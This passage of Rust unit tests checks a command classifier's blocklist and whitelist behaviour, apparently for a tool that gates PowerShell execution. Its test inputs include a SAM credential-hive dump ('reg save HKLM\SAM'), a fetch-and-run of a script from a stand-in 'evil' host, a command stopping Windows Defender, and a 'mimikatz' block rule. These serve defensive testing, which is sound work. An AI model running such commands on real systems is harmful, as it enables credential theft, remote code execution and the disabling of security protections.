        assert_eq!(out.classification.decision, ExecDecision::Blocked);
        assert!(out.classification.impact.contains("operator policy"));
        assert!(out.draft.is_none());
    }

    #[test]
    fn disabling_a_builtin_rule_stops_blocking_that_category_only() {
        // Effective set = built-in floor minus the credential-access rule. The
        // previously-blocked credential command is now off-template (NotExecutable),
        // while another built-in category (download-and-execute) still blocks.
        // This is the regression guard: because Step 0 matches the passed set only,
        // the disabled rule is genuinely gone — no second built-in pass re-blocks it.
        let effective: Vec<BlocklistRule> = builtin_blocklist()
            .iter()
            .filter(|r| r.rule_id != "builtin.credential_access")
            .cloned()
            .collect();

        let cred =
            classify_command_with_all(&shell_input("reg save HKLM\\SAM sam.hive"), &[], &effective);
        assert_ne!(
            cred.classification.decision,
            ExecDecision::Blocked,
            "disabled credential-access rule must no longer block"
        );

        let dl =
            classify_command_with_all(&shell_input("iwr http://evil/x.ps1 | iex"), &[], &effective);
        assert_eq!(
            dl.classification.decision,
            ExecDecision::Blocked,
            "other built-in rules still block"
        );
    }

    #[test]
    fn disabling_the_service_verb_rule_stops_the_combination_deny() {
        // With the service_verb rule removed, "Stop-Service WinDefend" is no longer
        // a combination hit. (It is off-template, so NotExecutable, not executable.)
        let effective: Vec<BlocklistRule> = builtin_blocklist()
            .iter()
            .filter(|r| r.rule_id != "builtin.service_verb")
            .cloned()
            .collect();
        let out =
            classify_command_with_all(&shell_input("Stop-Service WinDefend"), &[], &effective);
        assert_ne!(out.classification.decision, ExecDecision::Blocked);
    }

    #[test]
    fn empty_effective_blocklist_leaves_whitelist_working() {
        // A caller may (in principle) pass an empty effective set; the whitelist
        // still classifies normally and nothing is spuriously blocked. The daemon
        // cache never actually does this (it falls back to the built-in floor when
        // unsynced), but the core must be correct regardless.
        let out = classify_command_with_all(&shell_input("Get-Service -Name Spooler"), &[], &[]);
        assert_eq!(out.classification.decision, ExecDecision::ConfirmRequired);
        assert_eq!(
            out.classification.matched_template.as_deref(),
            Some("get_service_named")
        );
    }

    #[test]
    fn custom_rule_and_operator_template_compose() {
        // Operator template makes `Get-Disk` executable; an unrelated custom rule
        // does not interfere, but a custom rule matching it would block first.
        let ops = [operator_template(
            "get_disk",
            &["Get-Disk"],
            ExecEffect::ReadOnly,
        )];
        let unrelated = vec![custom_substring(
            "custom.mimikatz",
            "credential access",
            "mimikatz",
        )];
        let out = classify_command_with_all(&shell_input("Get-Disk"), &ops, &unrelated);
        assert_eq!(out.classification.decision, ExecDecision::ConfirmRequired);
        assert_eq!(
            out.classification.matched_template.as_deref(),
            Some("get_disk")
        );

        let blocking = vec![custom_substring(
            "custom.disk",
            "operator policy",
            "get-disk",
        )];
        let out = classify_command_with_all(&shell_input("Get-Disk"), &ops, &blocking);
        assert_eq!(out.classification.decision, ExecDecision::Blocked);
    }
}
